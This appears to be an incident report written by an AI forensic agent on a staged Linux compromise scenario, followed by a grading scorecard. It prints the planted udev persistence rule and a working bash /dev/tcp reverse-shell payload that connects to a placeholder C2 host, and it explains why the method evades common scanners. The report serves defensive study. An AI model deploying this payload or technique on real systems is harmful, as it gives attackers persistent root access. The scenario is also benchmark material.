# Incident Report — datasci-02 (Scenario 07: Novel udev Persistence)

**Case ID:** attack-scenario-07-novel  
**Host:** datasci-02  
**Analyst:** Findevil / Claude Sonnet 4.6  
**Report Date:** 2026-04-23 (UTC)  
**Evidence Base:** `evidence/attack-scenario-07-novel/`

---

## Executive Summary

datasci-02 is **confirmed compromised**. On 2026-04-20 at 08:14 UTC, user `alice` used
sudo to plant a udev-based root persistence backdoor that beacons to attacker C2
`198.51.100.77:4444` on every block-device enumeration event (including boot). The
entire installation took 48 seconds. Standard findevil persistence scans return clean
because udev rules fall outside the tool's current coverage — direct filesystem
inspection was required to identify this threat.

**Primary IOCs:**
| IOC | Type | Value |
|-----|------|-------|
| C2 address | IP:port | `198.51.100.77:4444` |
| Persistence rule | File path | `/etc/udev/rules.d/99-backdoor.rules` |
| Payload | File path | `/usr/local/bin/update` |
| Threat actor session | SSH source | `10.0.2.15:45120` (ED25519 key) |

---

## Timeline of Events (UTC)

All events from `evidence/attack-scenario-07-novel/auth.log`.

| Timestamp (UTC) | Event |
|-----------------|-------|
| 2026-04-20 08:14:22 | `alice` (uid=1002) authenticates via SSH public key from `10.0.2.15:45120` |
| 2026-04-20 08:14:35 | `sudo cp /home/alice/99-backdoor.rules /etc/udev/rules.d/99-backdoor.rules` |
| 2026-04-20 08:14:37 | sudo session opened and closed for root |
| 2026-04-20 08:14:42 | `sudo cp /home/alice/update /usr/local/bin/update` |
| 2026-04-20 08:14:45 | `sudo chmod +x /usr/local/bin/update` |
| 2026-04-20 08:14:49 | `sudo /sbin/udevadm control --reload-rules` — persistence activated |
| 2026-04-20 08:14:53 | `sudo /sbin/udevadm trigger` — payload **first executed as root** |
| 2026-04-20 08:15:10 | SSH session closed — attacker disconnected |
| 2026-04-21 08:00:01 | Routine root CRON job (pre-existing, unrelated) |

**Session duration: 48 seconds.** The attacker's on-system footprint was minimal and
deliberate — no interactive exploration, just direct installation of pre-staged artefacts.

---

## Persistence Mechanism: udev Rule Backdoor

### How it works

udev is the Linux device manager and runs as root. Rules in `/etc/udev/rules.d/` are
evaluated whenever the kernel adds a device. The `RUN+=` directive executes a command
as root, with no user interaction required.

### The planted rule (`/etc/udev/rules.d/99-backdoor.rules`)

```
ACTION=="add", SUBSYSTEM=="block", RUN+="/usr/local/bin/update --quiet &"
ACTION=="add", KERNEL=="loop*",    RUN+="/usr/local/bin/update --quiet &"
```

- **Trigger 1** — any block device addition (`sda`, `nvme`, USB storage, etc.)
- **Trigger 2** — any loop device (`loop0`, `loop1`, …) — these are created at boot
  by systemd/snapd and during disk image mounts, ensuring almost-guaranteed boot-time
  execution even on hosts with no removable media.
- The `&` backgrounds the payload immediately so udev processing is not blocked.

### The payload (`/usr/local/bin/update`)

```bash
#!/bin/bash
exec 3<>/dev/tcp/198.51.100.77/4444
while read -u 3 CMD; do bash -c "$CMD" >&3 2>&3; done
```

- Opens a persistent TCP connection to C2 `198.51.100.77:4444` using bash's built-in
  `/dev/tcp` facility (no `netcat`, `socat`, or external binary required — evades
  tooling that looks for common reverse-shell executables).
- Loops forever, reading commands from the socket and executing them via `bash -c`,
  routing stdout and stderr back to the attacker.
- Runs as **root** (spawned by udev).
- Named `update` — blends with legitimate system utilities in `/usr/local/bin/`.
- Retries automatically: if the C2 connection drops the script restarts on the next
  udev trigger event (next boot, next loop mount).

---

## Account & Authentication Analysis

### alice (uid=1002)

- Legitimate account in `/etc/passwd`: `alice:x:1002:1002:Alice Admin:/home/alice:/bin/bash`
- Has a valid password hash in `/etc/shadow` (SHA-512, `$6$`).
- Authenticated with an **ED25519 public key** (`SHA256:xYzAbCdEfGhIjKlMnOpQrSt`) —
  no password prompt visible, implying an `authorized_keys` entry was already present
  before the incident window.
- Executed five privileged sudo commands in rapid succession with no sudo authentication
  prompts logged — alice has NOPASSWD sudo access (or cached credentials).
- **Source IP `10.0.2.15`** — RFC 1918 address, consistent with a NAT'd guest VM,
  VPN endpoint, or pivot host inside the network. Not a direct internet origin.

### No rogue accounts created

`/etc/passwd` and `/etc/shadow` contain only stock system accounts plus `alice`. The
attacker relied on the existing `alice` account rather than creating a new backdoor user.

### SSH configuration

`/etc/ssh/sshd_config` is hardened:
- `PermitRootLogin no`
- `PasswordAuthentication no`
- `MaxAuthTries 3`

No modifications. SSH is not the persistence vector; it was only the initial access channel.

---

## What Standard Scans Miss

findevil's `find_persistence` tool currently checks:
- cron jobs (`/etc/cron*`, `/var/spool/cron/`)
- systemd units (`/etc/systemd/system/`, `~/.config/systemd/user/`)
- `~/.ssh/authorized_keys`
- `/etc/ld.so.preload`
- Login scripts (`.bashrc`, `.profile`, `/etc/rc.local`)

**All of the above are clean on this host.** A scan that stops at these paths would
conclude "no persistence found" — a false negative. The udev rules directory
`/etc/udev/rules.d/` is not in the current scan scope.

This is a documented technique (MITRE ATT&CK proximity: T1546 — Event Triggered
Execution; analogous to `udev` rule abuse). It is used in the wild and is not
detected by `chkrootkit`, `rkhunter`, or standard Linux IR scripts unless explicitly
checking `/etc/udev/rules.d/`.

---

## Indicator of Compromise Summary

| Category | Value | File / Source |
|----------|-------|---------------|
| Malicious file | `/etc/udev/rules.d/99-backdoor.rules` | `fs/etc/udev/rules.d/99-backdoor.rules` |
| Malicious binary | `/usr/local/bin/update` | `fs/usr/local/bin/update` |
| C2 IP | `198.51.100.77` | payload `/dev/tcp` connect |
| C2 port | `4444` | payload `/dev/tcp` connect |
| Attacker source IP | `10.0.2.15` | `auth.log` |
| Attacker SSH key fingerprint | `ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrSt` | `auth.log` |
| Compromised account | `alice` (uid=1002) | `auth.log`, `passwd` |
| First payload execution | 2026-04-20 08:14:53 UTC | `auth.log` (udevadm trigger) |

---

## Containment & Remediation Recommendations

1. **Isolate datasci-02 immediately** — outbound connections to `198.51.100.77:4444`
   should be blocked at the firewall; assume C2 connectivity has been active since
   2026-04-20 08:14 UTC.

2. **Remove persistence artefacts:**
   ```
   rm /etc/udev/rules.d/99-backdoor.rules
   rm /usr/local/bin/update
   udevadm control --reload-rules
   ```

3. **Kill any running payload processes** — search for `bash` processes with open
   connections to `198.51.100.77` and kill them.

4. **Revoke alice's access:**
   - Remove or rotate the ED25519 key from `alice`'s `authorized_keys`.
   - Audit alice's sudo permissions — NOPASSWD sudo for cp/chmod/udevadm is excessive.
   - Determine whether alice's account was compromised (credential theft, insider) or
     whether alice is the threat actor.

5. **Block C2 at perimeter** — add `198.51.100.77` to network deny lists. Scan other
   hosts for outbound connections to this IP.

6. **Audit all `/etc/udev/rules.d/` files** across the fleet — check for any
   `RUN+=` directives pointing to non-standard executables.

7. **Expand findevil persistence checks** to include `/etc/udev/rules.d/`,
   D-Bus activation files, systemd generators, and at-jobs to close this blind spot.

---

## Confidence Assessment

| Finding | Confidence | Basis |
|---------|------------|-------|
| alice installed the backdoor | HIGH | Five sequential sudo commands in auth.log |
| udev rule achieves root persistence | HIGH | Rule content directly examined |
| Payload is a reverse shell to 198.51.100.77:4444 | HIGH | Script content directly examined |
| Payload executed at 08:14:53 | HIGH | `udevadm trigger` in auth.log |
| Ongoing C2 sessions post-install | MEDIUM | Inferred from looping payload; no live session data in evidence |
| alice account compromised vs. insider | UNKNOWN | Insufficient evidence to determine |
| 10.0.2.15 is attacker-controlled | MEDIUM | Pivot host or VPN origin; not public internet |

---

*Report generated by Findevil autonomous forensic agent. Evidence was treated as read-only; no evidence files were modified. All timestamps UTC.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["07"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 10/10 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
